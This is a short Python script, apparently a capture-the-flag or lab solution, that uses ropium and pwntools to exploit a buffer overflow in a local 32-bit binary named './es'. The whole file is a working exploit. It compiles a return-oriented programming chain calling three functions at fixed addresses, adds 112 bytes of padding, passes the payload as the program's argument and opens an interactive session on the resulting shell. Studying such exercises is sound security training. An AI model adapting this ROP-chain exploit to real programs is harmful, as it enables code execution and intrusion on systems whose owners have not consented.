"""
Exploit write in Python with ropium and pwntools.
"""

from ropium import *
from pwn import *

file_path = './es'

EXE_FILE = file_path
exe = ELF(EXE_FILE)

# Specify compile architecture of binary and ABI
rop = ROPium(ARCH.X86)
rop.abi = ABI.X86_CDECL
# Loading binary in Ropium
rop.load(file_path)

# Build ROP chain
chain = rop.compile('0x080491e5(0xdeadbeef)')  # add_bin(0xdeadbeef)
chain += rop.compile('0x08049236(0xcafebabe, 0x0badf00d)')  # add_sh(0xcafebabe, 0x0badf00d)
chain += rop.compile('0x080491b6()')  # exec_string()

# Add padding for exploit
ropchain = b'A' * (108 + 4) + chain.dump('raw')

# Executing the executable with ropchain as input
io = process([EXE_FILE, ropchain])
io.interactive()

